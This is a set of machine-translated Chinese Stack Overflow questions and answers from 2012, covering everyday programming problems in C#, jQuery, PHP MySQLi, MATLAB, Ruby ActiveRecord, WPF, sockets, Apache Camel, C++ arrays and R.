所以我想写一个 spotify 桌面应用程序。问题是 spotify API 是用 C 编写的，我想用 C# 编写它，因为我更了解 C#。我意识到我需要使用 P/Invoke 和结构编组，并且我已经阅读了这两个主题。
我的问题是在 api.h 文件中有许多没有定义的结构（例如 sp_session）。
如果是这种情况，是否可以向库写入一种互操作？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T20:11:26.657

这个[codeplex](http://libspotifydotnet.codeplex.com/)项目可能会有一些用处。

# jquery - 如何使用 jQuery 单击拖动框架的内容？

> ID：12866362
> 
> 赞同：0
> 
> 时间：2012-10-12T20:08:58.287
> 
> 标签：jquery, frame, drag, frameset

我正在尝试在老式框架集中的框架上启用单击和拖动（类似于人们可能在 iPhone 或 iPad 上享受的触摸拖动交互）。

我正在寻找的功能类似于此处显示的功能：http:
[//jsfiddle.net/AhC87/2/](http://jsfiddle.net/AhC87/2/)

我使用 jQuery nicescroll 插件取得了一些小的成功，但它不支持水平滚动，而且看起来相当有问题且不一致（例如，即使在单击被释放后仍继续滚动）。

这是我试图在以下位置启用此行为的界面：
[http ://simrtk.net/map/map.php?x=258&y=176](http://simrtk.net/map/map.php?x=258&y=176)

左侧地图界面可以使用右上角的小地图滚动，所有传统的滚动方法都可以使用，但我认为启用点击拖动功能可能会更好，以使过程更加愉快。我也收到了这方面的请求。任何帮助将不胜感激！

注意：我为此使用了摇摇晃晃的旧框架集，因为使用 CSS 将控制侧边栏定位在地图上会导致在较慢的计算机上出现糟糕的性能，因此在这种情况下放弃框架集可能不是一种选择。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:47:53.390

您只需要集成您提到的 jsfiddle，为此`$(document).ready`在文件中的代码中添加以下 javascript `map_large.js`：

```
$("#map").mousedown(function(e){
    e.preventDefault();
    down=true;
    x=e.pageX;
    y=e.pageY;
    top=$(this).scrollTop();
    left=$(this).scrollLeft();
});

$("body").mousemove(function(e){
    if(down){
        var newX=e.pageX;
        var newY=e.pageY;

        //console.log(y+", "+newY+", "+top+", "+(top+(newY-y)));

        $("#map").scrollTop(top-newY+y);    
        $("#map").scrollLeft(left-newX+x);    
    }
});

$("body").mouseup(function(e){down=false;}); 
```

# php - PHP MySQLi 异步查询与

> ID：12866366
> 
> 赞同：11
> 
> 时间：2012-10-12T20:09:14.820
> 
> 标签：php, mysql, mysqli

我正在尝试通过 PHP MySQLi 使用异步查询。

以下代码已被简化，由于类依赖等原因，原始代码过于冗长，无法在此处列出。`mysqli_handle`还请假设已经设置了对连接的引用。

```
$query_1 = "SHOW TABLES FROM moxedo";
$query_2 = "CREATE TABLE `moxedo`.`mox_config_n85ad3` (`id` INT(11) UNSIGNED NOT NULL AUTO_INCREMENT , `group_id` INT(3) UNSIGNED NOT NULL , `is_enabled` INT(1) UNSIGNED NOT NULL , `tag` VARCHAR(255) NOT NULL , `name` VARCHAR(80) NOT NULL , `value` VARCHAR(255) NOT NULL , `description` TEXT NOT NULL , `init_params` TEXT NOT NULL , `datetime_added` DATETIME NOT NULL , `datetime_lastmodified` DATETIME NOT NULL , `timestamp_univ` BIGINT(14) NOT NULL , PRIMARY KEY ( `id` ) ) ENGINE = INNODB
";
$query_3 = "ALTER TABLE `moxedo`.`mox_config_n85ad3` ADD UNIQUE `ix_u_tag_oq` ( `tag` )";
$query_4 = "SHOW TABLES FROM moxedo";

if (!$mysqli_stmt_obj = $mysqli_handle->query($query_1)) 
{
   printf("Error: %s\n", $mysqli_handle->error);
}

if (!$mysqli_stmt_obj = $mysqli_handle->query($query_2, MYSQLI_ASYNC)) 
{
   printf("Error: %s\n", $mysqli_handle->error);
}

if (!$mysqli_stmt_obj = $mysqli_handle->query($query_3, MYSQLI_ASYNC)) 
{
   printf("Error: %s\n", $mysqli_handle->error);
}

if (!$mysqli_stmt_obj = $mysqli_handle->query($query_4)) 
{
   printf("Error: %s\n", $mysqli_handle->error);
} 
```

对查询 1 的调用通过 OK。对查询 2 的调用也通过 OK。

但是，当我尝试执行查询 3 和查询 4 ​​时，出现“命令不同步；您现在无法运行此命令”错误。从我的在线研究中，我发现了一些关于使用`mysqli_free_result`但查询 2 和查询 3的信息没有结果集。

我需要做什么才能正确完成异步调用，以便我可以进行多次调用而不会出现此错误？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2013-10-21T12:38:24.000

不幸的是，mysqli 文档相当缺乏，尤其是在这方面。问题是“异步”模式是 mysql 客户端行为，而不是客户端/服务器协议的一部分。也就是说，在给定时间，您仍然只能在连接上运行一个查询（或者我想是多个查询）。`MYSQLI_ASYNC`仅指定您的应用程序在等待查询结果时不应阻塞。结果必须稍后收集[`mysqli_poll()`](http://www.php.net/manual/en/mysqli.poll.php)。

在您的示例中，`$query_1`是同步的，因此在它返回并分配给`$mysqli_stmt_obj`. `$query_2`异步启动`$mysqli_handle`成功，不等待结果就返回。到脚本到达时`$query_3`，它仍有待处理的结果等待`$query_2`。因此，它会在完成最后一个查询之前尝试发送另一个查询，从而为您提供“命令不同步”。

# matlab - 从 sprintf 函数中检索值？

> ID：12866369
> 
> 赞同：1
> 
> 时间：2012-10-12T20:09:22.953
> 
> 标签：matlab

我正在寻求建议，看看是否有人知道如何让这个工作......我有一些球员姓名，我想将其转换为数字以存储在列表中。

```
for k = 1:player_name;
    pn = sprintf('Enter the name of player %d', k);
    inputdlg(pn);
end 
```

例如，我想检索玩家 2 的姓名。我在想类似的事情：

```
player1 = str2num(pn %d, k); 
```

但我无法让这个工作......任何想法都得到了极大的欢迎！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:23:23.057

这是我对您的问题的解决方案：

```
numPlayers = inputdlg('Enter the number of players');
numPlayers = str2num(numPlayers{1});

for i=1:numPlayers
    name{i} = inputdlg(['Enter the name of player ' num2str(i)]);
end 
```

现在访问玩家 1 的名字

```
name1 = name{1} 
```

# .net - 企业 .net 应用程序的官方实践和模式 Microsoft 文档？

> ID：12866372
> 
> 赞同：0
> 
> 时间：2012-10-12T20:09:32.453
> 
> 标签：.net, documentation

在哪里可以找到企业 .net 应用程序的官方实践和模式 Microsoft 文档？

我到处都能找到小碎片，我唯一能找到的是 2003 年的。

我发现很难找到 Practice and Patterns 的官方文档，只有我一个吗？

像这样的东西：http: [//msdn.microsoft.com/en-us/library/ms998469.aspx ?rssCatalog](http://msdn.microsoft.com/en-us/library/ms998469.aspx?rssCatalog)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-16T12:39:21.020

您是否尝试过查看 Microsoft 模式和实践网站？

他们的完整文档目录[在此处在线](http://msdn.microsoft.com/en-us/practices/bb190351)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-12T20:11:56.103

我不太确定您在问什么，但也许您正在寻找 Enterprise Library Framework？

[http://msdn.microsoft.com/en-us/library/ff648951.aspx](http://msdn.microsoft.com/en-us/library/ff648951.aspx)

# mysql - 从字段中删除空格后，Ruby/ActiveRecord 未检测到更改

> ID：12866376
> 
> 赞同：7
> 
> 时间：2012-10-12T20:09:43.687
> 
> 标签：mysql, ruby, activerecord

我正在尝试使用 mysql2 适配器和 ActiveRecord 从 MySQL 数据库中的各个字段中删除空格和回车：
Ruby 1.9.3p194
ActiveRecord 3.2.8
MySQL 5.5.28

```
foo = People.find(1)
foo.name => "\rJohn Jones"
foo.name.lstrip! => "John Jones"
foo.name => "John Jones"
foo.changes => {} #no changes detected to foo.name???
foo.save => true # but does nothing to database. 
```

如果我做：

```
foo.name = "John Jones"
foo.save => true
People.find(1).name => "John Jones" # this works and saves to database 
```

我已经到处搜索了...有什么建议吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-12T20:12:03.437

当您对模型属性进行就地修改时，不会发生分配，模型也不知道已进行任何更改。正确的方法是重新分配：

```
foo.name = foo.name.lstrip 
```

这会触发该`name=`方法并进行脏跟踪。

# javascript - 开始 CSS 动画 JavaScript

> ID：12866385
> 
> 赞同：3
> 
> 时间：2012-10-12T20:10:23.083
> 
> 标签：javascript, html, css, animation, css-animations

如何使用 js 启动 CSS 动画？第一行（webkitAnimation）有效，但其他行无效。

```
anim_logo.style.webkitAnimation="threesixty 3s";
anim_logo.style.mozAnimation="threesixty 3s";
anim_logo.style.oAnimation="threesixty 3s";
anim_logo.style.animation="threesixty 3s"; 
```

为什么？

[实时预览](http://s0ulp1xel.x10.mx/?p=home)（点击忍者之星）

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:14:35.630

您最好使用该动画创建一个单独的类，并在需要时将其附加到您的元素：

```
anim_logo.setAttribute("class", yourAnimationClass); 
```

**更新**

要删除新添加的类，您可以使用延迟函数：

```
function animateMe() {
    anim_logo.setAttribute( "class", yourAnimationClass );
    setTimeout( function() {
        anim_logo.setAttribute( "class", "" );
    }, 3000);
} 
```

# android - 千禧一代广告只显示一个巨大的白色矩形

> ID：12866388
> 
> 赞同：0
> 
> 时间：2012-10-12T20:10:27.197
> 
> 标签：android, eclipse, ads, millennial-media

我正在尝试在我的应用程序上实施千禧年媒体广告。我已经通过 XML 设置了它，但是当我运行应用程序时，它只显示一个占据一半屏幕的白色矩形。

同样在我的日志中，我得到一个

```
Millennial ad return failed. Zero content lenght returned. 
```

我的 XML 如下所示：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://millennialmedia.com/android/schema"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:id="@+id/mainLay">

    <com.millennialmedia.android.MMAdView
        android:id="@+id/mmadview"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        app:apid="APID"
        app:adType="MMBannerAdTop"
        app:refreshInterval="30"
        app:accelerate="true"
        app:ignoreDensityScaling="false"
    />

    <ListView
        android:id="@+id/list"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" >
    </ListView>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T21:10:24.640

这是千禧年媒体的杰森。这应该通过正确调整广告单元的大小来解决。看看*[XML 布局](http://wiki.millennialmedia.com/index.php/Android#XML_Layout)*。

您会看到 XML 包括：

```
app:height="60"
app:width="480" 
```

这将限制广告，使其不会占据屏幕并导致 SDK 向我们的服务器询问正确大小的广告，这可以解决您的无响应问题。

如果您仍然没有看到我们填写您的广告请求，或者如果您对 SDK 有任何其他问题，请随时在`https://support.mmedia.com/`.

# ios - 排序uitableview后如何显示节标题\ Tile

> ID：12866390
> 
> 赞同：0
> 
> 时间：2012-10-12T20:10:36.523
> 
> 标签：ios, uitableview, sections

我正在使用下面的代码按 Distributor 对我的 tableview 进行排序（按产品字母顺序排列）

```
 NSSortDescriptor *aSort =[[NSSortDescriptor alloc] initWithKey:@"Dis" ascending:YES];
    [distribArray sortUsingDescriptors:[NSMutableArray arrayWithObject:aSort]];

    NSLog( @"data from table %@", distribArray);

    [self.tableView reloadData];

    NSLog(@"ok2222222222");
    [[NSUserDefaults standardUserDefaults] setValue:@"Dis" forKey:@"ListBy"];
    [[NSUserDefaults standardUserDefaults] synchronize]; 
```

我想知道将分销商名称显示为该分销商所有产品上方的标题标题的最简单方法是什么。我目前在每个产品的单元格的详细信息视图中显示分销商名称。

我想从。

```
Product 1
Acme
Product 2
Acme
Product 3
Acme 
```

到下面这个并保留我的 UITableView\Cells

```
Acme
Product 1
Product 2
Product 3 
```

.... 非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T21:29:59.233

也许这不是最快的方法，但我认为它很简单

首先创建一个像这样的小型内部类：

```
@interface ProductSection
@property (strong, nonatomic) NSString* sectionName;
@property (strong, nonatomic) NSMutableArray* products;
@end 
```

然后用这个代替你的排序：

```
NSSortDescriptor *aSort =[[NSSortDescriptor alloc] initWithKey:@"Dis" ascending:YES];
NSArray* products = [distribArray sortUsingDescriptors:[NSMutableArray arrayWithObject:aSort]];

self.sections = [NSMutableArray array];

NSString* currentDistributor = nil;
for (Product* p in products) {
    if (![p.Dis isEqualToString:currentDistributor]) {
        ProductSection* section = [[ProductSection alloc] init];
        section.sectionName = p.Dis;
        section.products = [NSMutableArray array];
        [self.sections addObject:section];

        currentDistributor = p.Dis;
    }
    ProductSection* section = [self.sections lastObject];
    [section.products addObject:p];

}
[self.tableView reloadData]; 
```

哪里`self.sections`是一个可变数组`ProductSection`

接下来在你的`Table View Data Source`：

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
return [[[self.sections objectAtIndex:section] products] count]; 
```

}

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView {
return [self.sections count]; 
```

}

```
- (NSString *)tableView:(UITableView *)tableView titleForHeaderInSection:(NSInteger)section {
[[self.sections objectAtIndex:section] sectionName]; 
```

}

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
Product* p = [[[self.sections objectAtIndex:indexPath.section] products] objectAtIndex:indexPath.row];
... 
```

}

希望这会有所帮助

# wpf - WPF：在用户控件中设置键盘焦点？（键绑定问题）

> ID：12866392
> 
> 赞同：11
> 
> 时间：2012-10-12T20:10:41.923
> 
> 标签：wpf, xaml, focus

我有一个应用程序，它的主窗口包含一堆东西。有时，用户会做一些事情来响应我想在主窗口中完全显示其他内容，暂时隐藏那里的内容。

我通过使主窗口中的最外层元素成为没有定义行或列的 Grid 来做到这一点。网格中的每个元素，然后将完全填充网格中的一个单元格，绘制在其他单元格之上。

然后，我的常规一堆东西在网格的第一个元素中，而我暂时的其他东西是作为网格的第二个元素的 UserControl，通常设置为 Visibility=Collapsed。

除了 KeyBinding 一切正常。当在常规一堆东西中触发适当的命令时，UserControl 上的可见性设置为可见，它完全覆盖了常规一堆东西。当用户单击 UserControl 上的关闭按钮时，它的可见性再次设置为 Collapsed，然后它就会消失并显示常规的一堆东西。

我的问题是 KeyBindings。我在 UserControl 上定义了一些 - 不应该在主窗口上定义 - 它们不起作用。或者更确切地说，一旦我在 UserControl 中单击，它们就可以正常工作，但在我这样做之前它们不会工作。

我需要它们在 UserControl 可见后立即工作，而不需要用户单击或按 Tab 键进入 UserControl。

我的猜测是这与键盘焦点有关 - 但我一直无法找到将焦点设置在 UserControl 上的方法。事情是这样的——UserControl 中唯一的元素是一个选项卡控件，它的所有选项卡都是通过模板动态构建的。在编译时没有已知的元素可以显式引用并传递给 KeyBoard.Focus()。

那么，我是否正确地认为导致问题的原因是注意力不集中？如果是这样，当我什至不知道有多少个选项卡时，如何将焦点设置到 TabControl 中的元素，更不用说选择哪个选项卡了？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-10-15T16:03:01.680

我希望这个控件在它变得可见时具有焦点。所以在构造函数中，我在 IsVisibleChanged 上设置了一个处理程序。

```
public MyControl
{
    ...
    this.IsVisibleChanged += new DependencyPropertyChangedEventHandler(MyControl_IsVisibileChanged);
}

void MyControl_IsVisibleChanged(object sender, DependencyPropertyChangedEventArgs e)
{
    if (!(bool(e.NewValue)
        return;
    this.Focusable = true;
    Keyboard.Focus(this);
} 
```

我可以在 xaml 中设置 Focusable，但我更喜欢在代码隐藏中设置它，以便所有相关代码都在一个地方。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-03-20T10:54:14.423

对我来说，这在代码隐藏中起作用：

```
using System.Windows.Input;

namespace MyApplication.Views.Dialogs
{
    public partial class MyControl
    {
        public MyControl()
        {
            InitializeComponent();
            Loaded += (sender, args) =>
            {
                MyButton.Focus();
                Keyboard.Focus(MyButton);
            };
        }
    }
} 
```

# asp.net - 无法在 ajax 调用中测试 Web Service 的返回值

> ID：12866396
> 
> 赞同：0
> 
> 时间：2012-10-12T20:11:05.383
> 
> 标签：asp.net, ajax, web-services

我有以下 jQuery 代码：

```
var isUsernameAvailable = false;

function CheckUsername(uname) {
        $.ajax({
            method: "POST",
            url: "IsUsernameAvailable.asmx/IsAvailable",
            data: { username: uname },
            dataType: "text",
            success: OnSuccess,
            error: OnError
        });     // end ajax
    }   // end CheckUsername
    function OnSuccess(data) {            
        if (data == true) {    // WHY CAN'T I TEST THE VALUE
            isUsernameAvailable = true;
        } else {
            isUsernameAvailable = false;
            $('#error').append('Username not available');
        }
    }
    function OnError(data) {
        $('#error').text(data.status + " -- " + data.statusText);            
    } 
```

还有一个简单的 Web 服务：

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
// To allow this Web Service to be called from script, using ASP.NET AJAX, uncomment the following     line. 
[System.Web.Script.Services.ScriptService]
public class IsUsernameAvailable : System.Web.Services.WebService {

    public IsUsernameAvailable () {

        //Uncomment the following line if using designed components 
        //InitializeComponent(); 
    }

    [WebMethod]
    public bool IsAvailable(string username) {
        return (username == "xxx");
    }

} 
```

我只是无法从我的网络服务中读取返回值。当我打印出回调函数（`data`参数）中的值时，我得到`true`或`false`（注意前面的空格）。

当我打印出来时`data.d`，它说`undefined`。仅供参考，网络服务方法每次都会受到打击。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:15:34.160

您已`dataType`指定为`text`. 这会让我相信你得到的响应实际上是一个字符串，而不是一个布尔值。将 dataType 切换为`json`会给你一个 Javascript 对象。

**编辑**：解析器错误的原因是因为您返回的布尔值实际上是一个转换为字符串的 .NET 布尔值。当`.ToString()`最终被调用以获取实际的 HTTP 响应时，它最终是`True`or `False`。在 JSON 中，布尔值是`true`或`false`（注意大小写）。当 jQuery 试图解析响应时，它认为它不是一个正确的布尔值并抛出错误。

根据您使用的 ASP.NET 风格，您有几个选择。如果您使用的是 MVC 或 Web API，只需像这样返回：

```
return Json(username == "xxx", JsonRequestBehavior.AllowGet); 
```

如果您没有使用这些技术中的任何一种，那么最好将返回类型更改为字符串，然后调用：

```
return new JavaScriptSerializer().Serialize(username == "xxx"); 
```

您需要导入`System.Web.Script.Serialization`命名空间才能使前面的代码片段正常工作。

# sockets - 为什么客户端在面向连接的通信中而不是在连接较少的通信中进行套接字绑定

> ID：12866402
> 
> 赞同：0
> 
> 时间：2012-10-12T20:11:40.510
> 
> 标签：sockets, tcp, network-programming, udp

我在复习我的 sockte 编程知识时遇到了一个疑问。

首先让我解释一下我对套接字的理解。

1.  套接字绑定将套接字与端口相关联。
2.  套接字绑定帮助内核识别它应该转发传入数据包的进程。

在面向连接的通信套接字建立如下

*   在服务器端socket()-->bind()-->listen()-->accept().....
*   客户端是socket()-->connect-->......

我的问题是为什么客户端不需要绑定到套接字。在客户端情况下，如果它发送一个请求，它必须得到对其套接字的响应，内核必须将其转发给它的进程。这些事情的发生不需要绑定吗？如果不需要，内核将如何理解将响应发送给谁包？同样在连接较少的客户端调用绑定套接字。为什么这里需要它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-04-19T23:22:58.137

> 我的问题是为什么客户端不需要绑定到套接字。

`connect()`因为如果您自己没有绑定套接字，内核会在您调用时自动进行绑定。

> 同样在无连接客户端调用绑定套接字。为什么这里需要它？

因为否则套接字没有绑定到 IP 地址：端口，所以它不能发送或接收任何东西。它没有通往外部世界的道路。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-12T20:27:27.317

你总是先打开一个套接字。这是通过内核的路径。对说 TCP的`connect`调用发生在创建套接字之后。

查看 TCP 与 UDP 客户端。

TCP

```
s  = socket(options....)
connect(s)
send(s, data) 
```

UDP

```
s = socket(options....)
send(s, data) 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-10-12T21:01:04.130

`bind("0.0.0.0", 0)`（所有接口，任何端口）如果您调用`connect(...)`或`listen(...)`没有明确的`bind(...)`.

即使在无连接的情况下，所有套接字也必须绑定到本地端口，以便可以进行双向通信（即使您不打算这样做）。

# java - 与 Netty 一起使用时骆驼服务池背后的逻辑

> ID：12866403
> 
> 赞同：1
> 
> 时间：2012-10-12T20:11:40.827
> 
> 标签：java, multithreading, netty, apache-camel

我有一个带有 Netty 端点的骆驼实例，它整合了许多传入请求以发送到单个接收器。更具体地说，这是一个 Web 服务，其中每个传入的 SOAP 请求都会导致`Producer.sendBody()`进入骆驼子系统。每个请求的处理涉及不同的路由，但它们都将最终在单个 Netty 端点中发送到下一级服务器。一切都很好，只要我在任何时候只有少数传入请求。但是，如果我开始有超过 100 个同时请求，我会收到以下异常：

```
java.lang.IllegalStateException: Queue full
    at java.util.AbstractQueue.add(AbstractQueue.java:71) ~[na:1.6.0_24]
    at java.util.concurrent.ArrayBlockingQueue.add(ArrayBlockingQueue.java:209) [na:1.6.0_24]
    at org.apache.camel.impl.DefaultServicePool.release(DefaultServicePool.java:95) [camel-core-2.9.2.jar:2.9.2]
    at org.apache.camel.impl.ProducerCache$1.done(ProducerCache.java:297) ~[camel-core-2.9.2.jar:2.9.2]
    at org.apache.camel.processor.SendProcessor$2$1.done(SendProcessor.java:120) ~[camel-core-2.9.2.jar:2.9.2]
    at org.apache.camel.component.netty.handlers.ClientChannelHandler.messageReceived(ClientChannelHandler.java:162) ~[camel-netty-2.9.2.jar:2.9.2]
    at org.jboss.netty.channel.Channels.fireMessageReceived(Channels.java:296) ~[netty-3.3.1.Final.jar:na] 
```

这来自`DefaultServicePool`Netty 组件使用的那个。使用`DefaultServicePool`an`ArrayBlockingQueue`作为队列的后端，并将其设置为 100 个生产者的默认容量。出于性能原因，它使用服务池，以避免必须不断创建和销毁经常重用的生产者。很公平。不幸的是，我没有得到它是如何实现的逻辑。

这一切都始于`ProducerCache::doInAsyncProducer`，始于调用`doGetProducer`。所述方法尝试`acquire`从池中创建一个 Producer，如果失败，它会使用`endpoint.getProducer()`. 然后它确保服务池存在使用`pool.addAndAcquire`. 完成后，它返回到调用函数。在`doInAsyncProducer`它完成之前它会做它的事情，在这种情况下它会调用`done`处理器。至此，我们完全完成了交换的处理，所以它使用 Producer 将 Producer 释放回池中`pool.release`

这是橡胶上路的地方。该`DefaultServicePool::release`方法`ArrayBlockingQueue`使用`add`. 这就是我`java.lan.IllegalStateException`的来源。

为什么？好吧，让我们看一个用例。我有 101 个同时传入的请求。它们中的每一个都在大致相同的时间到达 Netty 端点。第一个创建容量为 100 的服务池，但启动时它是空的。事实上，这 101 个请求中的每一个都会从`endpoint.getProducer`;创建一个新的 Producer。每个都将验证它们不超过服务池的容量（为空）；并且每个都将继续发送到服务器。每次完成后，它都会尝试执行`pool.release`. 前 100 个将成功，因为尚未达到池容量。第 101 个请求将尝试添加到队列中并且会失败，因为队列已满！

那正确吗？如果我没看错，那么只要有超过 100 个同时请求，这段代码就会失败。我的服务需要支持超过 10,000 个并发请求，所以这不会成功。

似乎更稳定的解决方案可能是：

1.  在初始化时预分配所有 100 个生产者
2.  `acquire`在生产者可用之前阻塞
3.  如果使用 ServicePool，绝对不要创建自己的非池生产者

与此同时，我正在考虑限制传入的请求。

我对这个问题的期望是了解我是否正确阅读了该逻辑并查看它是否可以更改。或者，我用错了吗？有没有更好的方法来处理这种类型的事情？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-14T12:25:43.353

是的，应该改进恕我直言的逻辑。我已经记录了一张票来改进这一点。 [https://issues.apache.org/jira/browse/CAMEL-5703](https://issues.apache.org/jira/browse/CAMEL-5703)

# c++ - 在 C++ 中比较数组是否相等

> ID：12866413
> 
> 赞同：58
> 
> 时间：2012-10-12T20:12:32.403
> 
> 标签：c++, arrays, comparison, equality

有人可以向我解释为什么以下代码的输出说数组**不相等**吗？

```
int main()
{

    int iar1[] = {1,2,3,4,5};
    int iar2[] = {1,2,3,4,5};

    if (iar1 == iar2)
        cout << "Arrays are equal.";
    else
        cout << "Arrays are not equal.";

    return 0;   
} 
```

* * *

## 回答 #1

> 赞同：97
> 
> 时间：2012-10-12T20:18:16.470

```
if (iar1 == iar2) 
```

这里`iar1`和`iar2`正在*衰减*到指向各个数组的第一个元素的指针。由于它们是两个不同的数组，因此指针值当然是不同的，并且您的比较测试也不相等。

要进行逐元素比较，您必须编写一个循环；或[`std::array`](http://en.cppreference.com/w/cpp/container/array)改用

```
std::array<int, 5> iar1 {1,2,3,4,5};
std::array<int, 5> iar2 {1,2,3,4,5};

if( iar1 == iar2 ) {
  // arrays contents are the same

} else {
  // not the same

} 
```

* * *

## 回答 #2

> 赞同：74
> 
> 时间：2012-10-13T07:25:45.097

由于还没有人提到它，您可以将数组与`std::equal`算法进行比较：

```
int iar1[] = {1,2,3,4,5};
int iar2[] = {1,2,3,4,5};

if (std::equal(std::begin(iar1), std::end(iar1), std::begin(iar2)))
    cout << "Arrays are equal.";
else
    cout << "Arrays are not equal."; 
```

您需要包括`<algorithm>`和`<iterator>`。如果你还没有使用 C++11，你可以这样写：

```
if (std::equal(iar1, iar1 + sizeof iar1 / sizeof *iar1, iar2)) 
```

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2012-10-12T20:13:52.493

您不是在比较数组的内容，而是在比较数组的地址。由于它们是两个独立的数组，因此它们具有不同的地址。

通过使用更高级别的容器（例如 、 或 ）来避免`std::vector`此`std::deque`问题`std::array`。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-10-12T20:13:41.237

数组不是原始类型，数组在 C++ 内存中属于不同的**地址。**

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2019-07-11T13:06:50.880

没人提`memcmp`吗？这也是一个不错的选择。

```
/* memcmp example */
#include <stdio.h>
#include <string.h>

int main ()
{
  char buffer1[] = "DWgaOtP12df0";
  char buffer2[] = "DWGAOTP12DF0";

  int n;

  n=memcmp ( buffer1, buffer2, sizeof(buffer1) );

  if (n>0) printf ("'%s' is greater than '%s'.\n",buffer1,buffer2);
  else if (n<0) printf ("'%s' is less than '%s'.\n",buffer1,buffer2);
  else printf ("'%s' is the same as '%s'.\n",buffer1,buffer2);

  return 0;
} 
```

参考：[http ://www.cplusplus.com/reference/cstring/memcmp/](http://www.cplusplus.com/reference/cstring/memcmp/)

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2017-09-29T05:04:31.417

如果您不愿意将现有代码更改为`std::array`，则使用几个方法来代替，它们采用[非类型模板参数](http://en.cppreference.com/w/cpp/language/template_parameters#Non-type_template_parameter)：

```
//Passed arrays store different data types
template <typename T, typename U, int size1, int size2>
bool equal(T (&arr1)[size1], U (&arr2)[size2] ){
    return false;
}

//Passed arrays store SAME data types
template <typename T, int size1, int size2>
bool equal(T (&arr1)[size1], T (&arr2)[size2] ){
    if(size1 == size2) {
        for(int i = 0 ; i < size1; ++i){
            if(arr1[i] != arr2[i]) return false;
        }
        return true;
    }
    return false;
} 
```

这是[演示](https://www.ideone.com/QSNneV)。请注意，在调用时，我们只需要传递数组变量，例如`equal(iar1, iar2)`在您的情况下，不需要传递数组的大小。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2012-10-12T20:15:13.943

您正在比较地址而不是值。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2020-05-02T00:03:55.423

两者都将内存地址存储到两个不同数组的第一个元素。这些地址不能相等，因此输出。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-10-12T20:14:37.123

对。在*大多数*（如果不是所有的 C 实现）中，数组标识符可以隐式转换为指向第一个元素的指针（即第一个元素的地址）。您在这里所做的是比较这些地址，这显然是错误的。

相反，您需要遍历这两个数组，并相互检查每个元素。如果你在没有失败的情况下完成了两者，它们是平等的。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2012-10-12T21:49:15.280

当我们使用数组时，我们实际上是在使用指向数组中第一个元素的指针。因此，这个条件`if( iar1 == iar2 )`实际上比较了两个地址。这些指针不指向同一个对象。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-11-30T23:27:23.787

如果您愿意使用`std::array`而不是内置数组，您可以使用：

```
std::array<int, 5> iar1 = {1,2,3,4,5};
std::array<int, 5> iar2 = {1,2,3,4,5};

if (iar1 == iar2) 
```

# arrays - 如何成对循环遍历数组？

> ID：12866418
> 
> 赞同：4
> 
> 时间：2012-10-12T20:12:54.373
> 
> 标签：arrays, r, matrix, dataframe

我有一个 1000x1 向量（1000 行和 1 列）。我想成对获取元素（第 1 行和第 2 行、第 3 行和第 4 行、第 5 行和第 6 行等）

这是我到目前为止所拥有的

```
for (j in 1: ncol(total_loci)){
    for (i in 1: sample_size){
    # a pair
    genotype[i]<- paste(total_loci[i, j], total_loci[i+1,j], sep="")
    }
} 
```

因此，基因型应该是包含基因型的 500x1 向量（500 行和 1 列）。假设我的 for 循环是正确的。我认为我需要跳过所有其他索引——所以我`i`应该从 1 开始，然后是 3、5、7、9 等。变量`total_loci`是类数据框。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:16:20.357

您应该尽可能尝试使用矢量化解决方案。它们通常比循环更节省内存和更快。

在这种情况下，您可以使用`seq`它为每个其他元素生成一个索引向量。然后，您可以使用该索引向量成对地对原始向量进行子集化。

```
# sample data
x <- replicate(5, sample(LETTERS, 1000, replace=TRUE), simplify=FALSE)
x <- as.data.frame(x, stringsAsFactors=FALSE)
names(x) <- paste("V",1:NCOL(x), sep="")

# function to concatenate every other observation as a pair
f <- function(x) {
  s <- seq(2, length(x), 2)
  paste(x[s-1], x[s], sep="")
}

# run algorithm for each column
y <- as.data.frame(lapply(x, f), stringsAsFactors=FALSE) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T20:52:53.127

`n`这是处理连续元素块中的数组的一般方法。您可以设置`n = 2`成对处理它。

首先，这是一个将向量 n×n 分割的函数，返回一个`n`元素列表：

```
n.ny.n <- function(x, n) split(x, 1+(seq_along(x)-1) %% n)

n.by.n(x = 1:24, n = 2)
# $`1`
#  [1]  1  3  5  7  9 11 13 15 17 19 21 23
# 
# $`2`
#  [1]  2  4  6  8 10 12 14 16 18 20 22 24 
```

